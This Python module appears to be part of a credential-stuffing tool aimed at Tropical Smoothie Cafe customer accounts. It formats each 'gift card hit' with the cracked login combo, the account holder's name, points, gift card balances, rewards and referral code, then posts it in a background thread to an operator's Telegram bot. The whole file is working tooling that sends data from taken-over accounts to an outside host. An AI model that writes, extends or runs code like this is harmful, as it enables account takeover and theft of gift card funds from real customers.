"""Telegram notifications for gift card hits."""

from __future__ import annotations

import os
import threading
from typing import Any

import requests

from .api import AccountResult, format_gift_card

BRAND_NAME = os.environ.get("TROPIC_BRAND_NAME", "Tropical Smoothie Cafe")


def is_configured() -> bool:
    return bool(_bot_token() and _chat_id())


def _bot_token() -> str:
    return os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()


def _chat_id() -> str:
    return os.environ.get("TELEGRAM_CHAT_ID", "").strip()


def has_gift_cards(result: AccountResult) -> bool:
    return bool(result.gift_cards)


def format_gift_card_hit(result: AccountResult) -> str:
    lines = [
        f"🌴 GIFT CARD HIT — {BRAND_NAME}",
        "",
        f"Login: {result.combo}",
    ]
    if result.display_name:
        lines.append(f"Name: {result.display_name}")
    lines.append(f"Points: {result.points or 0}")

    total = result.gift_card_balance
    lines.append("")
    lines.append(f"💳 Gift Cards (${total:.2f} total):")
    for i, card in enumerate(result.gift_cards, 1):
        detail = format_gift_card(card)
        lines.append(f"  {i}) {detail}")

    lines.append("")
    lines.append("🎁 Rewards:")
    if result.rewards:
        for reward in result.rewards[:10]:
            name = reward.get("name") or "Reward"
            exp = reward.get("expiring_at") or reward.get("expiring_at_tz")
            if exp:
                lines.append(f"  • {name} (exp {exp})")
            else:
                lines.append(f"  • {name}")
        if len(result.rewards) > 10:
            lines.append(f"  • ... +{len(result.rewards) - 10} more")
    else:
        lines.append("  • none")

    referral = (result.profile or {}).get("referral_code")
    if referral:
        lines.append("")
        lines.append(f"Referral: {referral}")

    return "\n".join(lines)


def send_message(text: str) -> tuple[bool, str]:
    token = _bot_token()
    chat_id = _chat_id()
    if not token:
        return False, "TELEGRAM_BOT_TOKEN not set"
    if not chat_id:
        return False, "TELEGRAM_CHAT_ID not set — message @tropicalhitsbot then check /api/telegram/status"

    try:
        resp = requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            json={
                "chat_id": chat_id,
                "text": text,
                "disable_web_page_preview": True,
            },
            timeout=15,
        )
        data = resp.json()
        if resp.ok and data.get("ok"):
            return True, "sent"
        return False, data.get("description", resp.text[:200])
    except requests.RequestException as exc:
        return False, str(exc)


def notify_gift_card_hit(result: AccountResult) -> None:
    if not has_gift_cards(result) or not is_configured():
        return

    text = format_gift_card_hit(result)

    def _send() -> None:
        send_message(text)

    threading.Thread(target=_send, daemon=True).start()


def get_pending_chat_ids() -> list[dict[str, Any]]:
    token = _bot_token()
    if not token:
        return []
    try:
        resp = requests.get(
            f"https://api.telegram.org/bot{token}/getUpdates",
            timeout=15,
        )
        data = resp.json()
        if not data.get("ok"):
            return []
        chats: dict[str, dict[str, Any]] = {}
        for item in data.get("result", []):
            msg = item.get("message") or item.get("edited_message") or {}
            chat = msg.get("chat") or {}
            chat_id = chat.get("id")
            if chat_id is None:
                continue
            key = str(chat_id)
            chats[key] = {
                "chat_id": key,
                "type": chat.get("type"),
                "username": chat.get("username"),
                "first_name": chat.get("first_name"),
                "last_name": chat.get("last_name"),
            }
        return list(chats.values())
    except requests.RequestException:
        return []
